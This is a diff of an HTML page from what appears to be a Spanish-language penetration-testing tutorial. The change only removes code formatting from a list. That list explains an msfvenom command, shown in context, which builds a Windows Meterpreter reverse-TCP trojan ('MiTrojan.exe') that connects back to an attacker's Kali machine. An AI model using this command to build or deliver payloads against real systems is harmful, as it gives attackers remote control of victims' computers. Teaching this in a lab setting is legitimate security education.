@@ -104,12 +104,12 @@
   <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP_KALI ojo reemplazar&gt; LPORT=4444 -f exe -o MiTrojan.exe</code></pre>
 
   <ul>
-    <li><code>msfvenom</code>: Herramienta de Metasploit para crear payloads.</li>
-    <li><code>-p windows/meterpreter/reverse_tcp</code>: Especifica el payload a usar, en este caso Meterpreter con una conexión inversa TCP para Windows.</li>
-    <li><code>LHOST=&lt;IP_KALI ojo reemplazar&gt;</code>: Dirección IP de Kali Linux.</li>
-    <li><code>LPORT=4444</code>: Puerto a utilizar para la conexión inversa.</li>
-    <li><code>-f exe</code>: Formato del payload, en este caso un archivo ejecutable.</li>
-    <li><code>-o MiTrojan.exe</code>: Nombre del archivo generado.</li>
+    <li>msfvenom: Herramienta de Metasploit para crear payloads.</li>
+    <li>-p windows/meterpreter/reverse_tcp: Especifica el payload a usar, en este caso Meterpreter con una conexión inversa TCP para Windows.</li>
+    <li>LHOST=&lt;IP_KALI ojo reemplazar&gt;: Dirección IP de Kali Linux.</li>
+    <li>LPORT=4444: Puerto a utilizar para la conexión inversa.</li>
+    <li>-f exe: Formato del payload, en este caso un archivo ejecutable.</li>
+    <li>-o MiTrojan.exe: Nombre del archivo generado.</li>
   </ul>
 
   <h3>🔸 5.4. Transferir el ejecutable</h3>
